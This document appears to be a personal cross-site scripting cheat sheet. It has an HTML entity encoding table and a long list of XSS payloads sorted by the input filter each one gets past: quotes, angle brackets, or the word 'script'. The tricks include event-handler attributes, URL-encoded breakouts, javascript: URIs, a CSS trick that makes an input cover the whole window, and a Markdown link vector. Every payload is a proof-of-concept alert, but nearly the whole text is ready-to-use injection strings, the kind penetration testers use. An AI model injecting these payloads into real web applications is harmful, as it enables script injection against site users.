XSS CheatSheet? - http://ha.ckers.org/xss.html

http://www.secureideas.net/tools



Original	Replacement
		Name	Dec	Hex
———		————	———	———
"		&quot;	&#34;	&#x22;
&		&amp;	&#38;	&#x26;
'		&apos;	&#39;	&#x27;
<		&lt;	&#60;	&#x3c;
>		&gt;	&#62;	&#x3e;
Examples:
	Basic XSS, no filters applied
	<script>alert("Hello World")</script>
	"><script>alert(1)</script>
	
	XSS with no ' or " quotes allowed as they are filtered
	<script>alert(/hello/.source)</script>
	<script>alert(1)</script>
	<IMG SRC=javascript:alert(1)>
	javascript%3aalert(2)%2f%2f

	XSS with no < or > allowed as they are filtered
	"%3balert(1)//
	'%3balert(1)//
	%27%29;alert%281%29;//
	test%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
	';}alert('xss');function asdf(){a='
	\x27-confirm`1`-\x27 
	\u0027-confirm`1`-\u0027 


	<html><body><script>alert(1)</script></body></html>

	<a/ondrag=alert()>
	<x~%0Aonmouseover=alert(1)>AAA
	test%22+onmouseover%3D%22alert(1)
	test" onmouseover="alert(1)" fakeattribute="
		We can also use CSS to expand the input box to cover the entire window:
		test" onmouseover="alert(1)" style="position:absolute;top:0px;left:0px;width:100%;height:100%" fakeattribute="
	campaignId=k8bx2" accesskey="y" onclick="alert(1)"//k8bx2
	

	XSS with the word "script" filtered out:
	--%3E%3Cimg%20src%3da%20onerror%3dalert%281%29%3E
	<IMG SRC='a' onerror=alert(1)>
	<img src=x onerror='alert(1);'/>
	<video src=1 onerror=alert(1)>
	<audio src=1 onerror=alert(1)>
	
	" onerror="alert(1)" src="4.jpg" type="image
	"/></a></><img src=f onerror=alert(1)>
	<body onload="alert(1)">
	<svg onload="alert(1)"></svg>
	<svg/onload=alert(/XSS/)>
	<svg onload=prompt(1)>
	<x~%0Aonfocus=alert%281%29%20id=a%20tabindex=0>#a
	"%3balert(1)//
	";alert(1);//
	'%3balert(1)//
	';alert(1);//
	javascript:alert(1)//
	javascript%3aalert%281%29%2f%2f
	");confirm(1);//
	STYLE= "xss:expression(alert('XSS'))
	%27%29;alert%281%29;//
	%27%29;%20alert%28%271%27%29;//
	test%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
	test%3cScRiPt%3ealert(1)%3c%2fScRiPt%3e
	"-alert(1)-"		
	%00”-alert(2)-"
	<div onfocus=alert('xx') id=xss style=display:table>
	';}alert('xss');function asdf(){a='
	'<scr'+'ipt>'alert(1)'<\/scr'+'ipt>'
	<a href="javascript:alert(1)">ClickMe</a>		#works in Markdown!!!
	onmouseover javascript:decodeURIComponent('%3d')"alert(1)  # %3d is an =
